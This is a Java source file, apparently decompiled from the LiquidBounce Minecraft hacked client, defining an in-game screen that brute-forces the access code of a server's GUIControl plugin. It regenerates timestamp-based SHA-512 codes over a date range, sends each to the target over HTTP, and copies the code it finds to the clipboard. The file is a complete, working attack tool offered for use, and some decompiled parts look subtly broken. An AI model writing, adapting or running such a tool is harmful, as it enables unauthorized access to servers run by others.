
package net.ccbluex.liquidbounce.ui.tools;

import java.net.ProtocolException;
import java.net.UnknownHostException;
import java.net.MalformedURLException;
import java.net.SocketTimeoutException;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.UnsupportedEncodingException;
import java.security.NoSuchAlgorithmException;
import java.security.MessageDigest;
import net.ccbluex.liquidbounce.utils.TabUtils;
import java.io.IOException;
import java.util.GregorianCalendar;
import net.minecraft.client.gui.FontRenderer;
import net.ccbluex.liquidbounce.ui.font.Fonts;
import org.lwjgl.input.Keyboard;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.StringSelection;
import java.awt.Toolkit;
import net.ccbluex.liquidbounce.utils.threading.ToggleableLoop;
import net.minecraft.client.gui.GuiButton;
import net.minecraft.client.gui.GuiTextField;
import net.minecraft.client.gui.GuiScreen;

public class GuiGUIControlBruteforce extends GuiScreen
{
    private GuiTextField ipField;
    private GuiTextField startField;
    private GuiTextField stopField;
    private GuiTextField passwordField;
    private GuiButton buttonToggle;
    private ToggleableLoop thread;
    private final GuiScreen prevGui;
    private int pps;
    private int ppsDisplay;
    private long prevReset;
    private long startTime;
    private long endTime;
    private long currentTime;
    private String status;
    
    public GuiGUIControlBruteforce(final GuiScreen prevGui) {
        this.endTime = System.currentTimeMillis();
        this.currentTime = 0L;
        this.status = "§7Wating...";
        this.prevGui = prevGui;
        String ip;
        String code;
        String reponse;
        this.thread = new ToggleableLoop(() -> {
            try {
                if (this.currentTime <= this.endTime) {
                    ip = this.ipField.getText();
                    code = this.generateCode(this.currentTime);
                    this.status = "§cTesting §a§l" + code + "§c on §a§l" + ip;
                    try {
                        reponse = this.getHttp("http://" + ip + "/MCGUIControlPlugin?code=" + code + "&query=none");
                        if (reponse.equals("success")) {
                            this.status = "§cCode: §a§l" + code;
                            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(code), null);
                            this.passwordField.setText(code);
                            this.thread.stopThread();
                        }
                    }
                    catch (Exception e) {
                        this.status = "§a§l" + e.getClass().getSimpleName() + ": §c" + e.getMessage();
                    }
                    ++this.currentTime;
                    ++this.pps;
                    if (System.currentTimeMillis() - this.prevReset > 1000L) {
                        this.ppsDisplay = this.pps;
                        this.pps = 0;
                        this.prevReset = System.currentTimeMillis();
                    }
                }
                else {
                    this.thread.stopThread();
                    this.status = "§a§lNo password found.";
                }
            }
            catch (Exception e2) {
                this.status = "§a§l" + e2.getClass().getSimpleName() + ": §c" + e2.getMessage();
            }
        }, "GUIControl-BruteForce");
    }
    
    public void initGui() {
        Keyboard.enableRepeatEvents(true);
        (this.ipField = new GuiTextField(0, (FontRenderer)Fonts.font40, this.width / 2 - 100, 60, 200, 20)).setText("localhost:8000");
        this.ipField.setFocused(true);
        this.ipField.setMaxStringLength(Integer.MAX_VALUE);
        (this.startField = new GuiTextField(1, (FontRenderer)Fonts.font40, this.width / 2 - 100, 90, 200, 20)).setMaxStringLength(Integer.MAX_VALUE);
        this.startField.setText(String.valueOf(new GregorianCalendar(2016, 5, 5).getTimeInMillis()));
        (this.stopField = new GuiTextField(2, (FontRenderer)Fonts.font40, this.width / 2 - 100, 120, 200, 20)).setMaxStringLength(Integer.MAX_VALUE);
        this.stopField.setText(String.valueOf(this.endTime));
        (this.passwordField = new GuiTextField(3, (FontRenderer)Fonts.font40, this.width / 2 - 100, this.height / 4 + 150, 200, 20)).setMaxStringLength(Integer.MAX_VALUE);
        this.buttonList.add(this.buttonToggle = new GuiButton(1, this.width / 2 - 100, this.height / 4 + 90, this.thread.isRunning() ? "Stop" : "Start"));
        this.buttonList.add(new GuiButton(0, this.width / 2 - 100, this.height / 4 + 120, "Back"));
        super.initGui();
    }
    
    public void drawScreen(final int mouseX, final int mouseY, final float partialTicks) {
        this.drawBackground(0);
        this.drawCenteredString((FontRenderer)Fonts.font40, "BruteForce (GuiControl)", this.width / 2, 34, 16777215);
        this.drawCenteredString((FontRenderer)Fonts.font35, (this.status == null) ? "" : this.status, this.width / 2, this.height / 4 + 50, 16777215);
        if (this.thread.isRunning()) {
            this.drawCenteredString((FontRenderer)Fonts.font35, "§a" + (this.currentTime - this.startTime) + " §c/ §a" + (this.endTime - this.startTime), this.width / 2, this.height / 4 + 60, 16777215);
            this.drawCenteredString((FontRenderer)Fonts.font35, "§cPPS: §a" + this.ppsDisplay, this.width / 2, this.height / 4 + 70, 16777215);
            try {
                final long seconds = (this.endTime - this.currentTime) / this.ppsDisplay / 1000L;
                final long minutes = seconds / 60L % 60L;
                final long hours = seconds / 3600L % 60L;
                final long days = seconds / 86400L;
                this.drawCenteredString((FontRenderer)Fonts.font35, "§cRemaining time: §a" + days + " days " + hours + " hours " + minutes + " minutes", this.width / 2, this.height / 4 + 80, 16777215);
            }
            catch (ArithmeticException ex) {}
            catch (Exception e) {
                e.printStackTrace();
            }
        }
        this.buttonToggle.displayString = (this.thread.isRunning() ? "Stop" : "Start");
        this.ipField.drawTextBox();
        this.startField.drawTextBox();
        this.stopField.drawTextBox();
        if (!this.passwordField.getText().isEmpty()) {
            this.passwordField.drawTextBox();
        }
        super.drawScreen(mouseX, mouseY, partialTicks);
    }
    
    protected void actionPerformed(final GuiButton button) throws IOException {
        switch (button.id) {
            case 0: {
                this.mc.displayGuiScreen(this.prevGui);
                break;
            }
            case 1: {
                try {
                    this.currentTime = Long.parseLong(this.startField.getText());
                    this.startTime = this.currentTime;
                    this.endTime = Long.parseLong(this.stopField.getText());
                    if (this.thread.isRunning()) {
                        this.thread.stopThread();
                    }
                    else {
                        this.thread.startThread();
                    }
                    if (!this.thread.isRunning()) {
                        this.status = "§a§lNo password found.";
                    }
                    else {
                        this.status = "Starting...";
                    }
                    this.buttonToggle.displayString = (this.thread.isRunning() ? "Stop" : "Start");
                    this.pps = 0;
                    this.ppsDisplay = 0;
                }
                catch (Exception e) {
                    this.status = "§a§l" + e.getClass().getSimpleName() + ": §c" + e.getMessage();
                }
                break;
            }
        }
        super.actionPerformed(button);
    }
    
    protected void keyTyped(final char typedChar, final int keyCode) throws IOException {
        if (1 == keyCode) {
            this.mc.displayGuiScreen(this.prevGui);
            return;
        }
        if (15 == keyCode) {
            TabUtils.tab(this.ipField, this.startField, this.stopField, this.passwordField);
        }
        if (this.ipField.isFocused()) {
            this.ipField.textboxKeyTyped(typedChar, keyCode);
        }
        if (this.startField.isFocused()) {
            this.startField.textboxKeyTyped(typedChar, keyCode);
        }
        if (this.stopField.isFocused()) {
            this.stopField.textboxKeyTyped(typedChar, keyCode);
        }
        if (this.passwordField.isFocused()) {
            this.passwordField.textboxKeyTyped(typedChar, keyCode);
        }
        super.keyTyped(typedChar, keyCode);
    }
    
    protected void mouseClicked(final int mouseX, final int mouseY, final int mouseButton) throws IOException {
        this.ipField.mouseClicked(mouseX, mouseY, mouseButton);
        this.startField.mouseClicked(mouseX, mouseY, mouseButton);
        this.stopField.mouseClicked(mouseX, mouseY, mouseButton);
        this.passwordField.mouseClicked(mouseX, mouseY, mouseButton);
        super.mouseClicked(mouseX, mouseY, mouseButton);
    }
    
    public void onGuiClosed() {
        Keyboard.enableRepeatEvents(false);
        this.thread.stopThread();
        super.onGuiClosed();
    }
    
    private String generateCode(final long time) {
        final String passwordToHash = String.valueOf(time / 1000L);
        final String salt = String.valueOf(time);
        String generatedPassword = null;
        try {
            final MessageDigest messageDigest = MessageDigest.getInstance("SHA-512");
            messageDigest.update(salt.getBytes("UTF-8"));
            final byte[] bytes = messageDigest.digest(passwordToHash.getBytes("UTF-8"));
            final StringBuilder stringBuilder = new StringBuilder();
            for (final byte aByte : bytes) {
                stringBuilder.append(Integer.toString((aByte & 0xFF) + 256, 16).substring(1));
            }
            generatedPassword = stringBuilder.toString();
        }
        catch (NoSuchAlgorithmException | UnsupportedEncodingException ex2) {
            final Exception ex;
            final Exception e = ex;
            e.printStackTrace();
        }
        return generatedPassword;
    }
    
    private String getHttp(final String urlToRead) {
        try {
            try {
                final StringBuilder stringBuilder = new StringBuilder();
                final URL url = new URL(urlToRead);
                final HttpURLConnection connection = (HttpURLConnection)url.openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(501);
                final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line);
                }
                bufferedReader.close();
                return stringBuilder.toString();
            }
            catch (SocketTimeoutException e2) {
                return "no_connection";
            }
            catch (MalformedURLException e) {
                e.printStackTrace();
                return "error";
            }
            catch (UnknownHostException host) {
                return "unknown_host";
            }
            catch (IOException e) {
                e.printStackTrace();
                return "error";
            }
        }
        catch (ProtocolException ex) {}
    }
}
